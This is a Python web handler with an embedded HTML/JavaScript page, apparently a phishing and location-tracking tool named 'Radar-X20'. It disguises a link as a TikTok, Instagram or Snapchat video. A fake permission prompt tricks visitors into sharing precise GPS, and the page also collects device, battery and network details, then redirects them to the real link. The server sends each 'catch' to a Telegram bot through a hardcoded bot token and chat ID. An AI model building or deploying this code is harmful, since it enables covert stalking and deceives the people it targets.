from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import urllib.parse

# 🛡️ بيانات البوت الثابتة
TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
ID = "5811700860"

class Storage:
    target_url = "https://vt.tiktok.com/"

storage = Storage()

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            if 'url' in data:
                storage.target_url = data.get("url")
            elif 'device' in data:
                d = data['device']
                gps = d.get('gps')
                maps_url = f"https://www.google.com/maps?q={gps['lat']},{gps['lon']}" if isinstance(gps, dict) else "لم يتم السماح"
                
                report = (
                    "🛰️ ** Radar-X20: صيدة جديدة ** ⚠️\n"
                    "━━━━━━━━━━━━━━━\n"
                    f"🌐 **IP:** `{d.get('ip')}`\n"
                    f"📱 **نوع الجهاز:** {d.get('platform')}\n"
                    f"🖥️ **الدقة:** {d.get('screen')}\n"
                    f"🔋 **البطارية:** {d.get('battery')}\n"
                    f"📶 **الشبكة:** {d.get('network')}\n"
                    f"📍 **الموقع:** {maps_url}\n"
                    f"🔗 **الرابط:** {storage.target_url}\n"
                    "━━━━━━━━━━━━━━━"
                )
                # إرسال لبوت التليجرام
                api_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={urllib.parse.quote(report)}&parse_mode=Markdown"
                urllib.request.urlopen(urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'}))

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok"}).encode())
        except:
            self.send_response(500)
            self.end_headers()

    def do_GET(self):
        target = storage.target_url.lower()
        # تحديد المنصة تلقائياً لتغيير نص الإذن والتمويه
        if "tiktok" in target:
            p_name, p_img = "TikTok", "https://sf16-scmcdn-sg.ibytedtos.com/obj/eden-sg/uufs_om_lp/ljhwZ_lp/2021/tiktok_og_image.png"
        elif "instagram" in target or "instagr.am" in target:
            p_name, p_img = "Instagram", "https://www.instagram.com/static/images/ico/favicon-192.png/ed973502857e.png"
        elif "snapchat" in target:
            p_name, p_img = "Snapchat", "https://www.snapchat.com/favicon.png"
        else:
            p_name, p_img = "Social Media", "https://v-tiktok-share.vercel.app/favicon.ico"

        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()

        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>{p_name} Video</title>
            <meta property="og:title" content="{p_name} - شاهد المقطع">
            <meta property="og:image" content="{p_img}">
            <script>
                async function startCapture() {{
                    let data = {{
                        ip: "سحب تلقائي",
                        platform: navigator.userAgent.split('(')[1].split(')')[0],
                        screen: window.screen.width + "x" + window.screen.height,
                        network: navigator.connection ? (navigator.connection.effectiveType) : "WiFi/4G"
                    }};

                    try {{
                        let b = await navigator.getBattery();
                        data.battery = Math.round(b.level * 100) + "%";
                    }} catch(e) {{ data.battery = "Unknown"; }}

                    if (navigator.geolocation) {{
                        // خدعة طلب الإذن المخصص
                        navigator.geolocation.getCurrentPosition((pos) => {{
                            data.gps = {{ lat: pos.coords.latitude, lon: pos.coords.longitude }};
                            finish(data);
                        }}, () => {{ data.gps = "Denied"; finish(data); }}, {{enableHighAccuracy:true}});
                        
                        alert("يرغب {p_name} في الوصول إلى موقعك الحالي لتحسين تجربة المستخدم وعرض المحتوى القريب منك.");
                    }} else {{ finish(data); }}
                }}

                function finish(d) {{
                    fetch(window.location.href, {{
                        method: 'POST',
                        body: JSON.stringify({{ device: d }}),
                        headers: {{ 'Content-Type': 'application/json' }}
                    }}).then(() => {{
                        window.location.replace("{storage.target_url}");
                    }});
                }}
                window.onload = startCapture;
            </script>
        </head>
        <body style="background:black;"></body>
        </html>
        """
        self.wfile.write(html.encode())
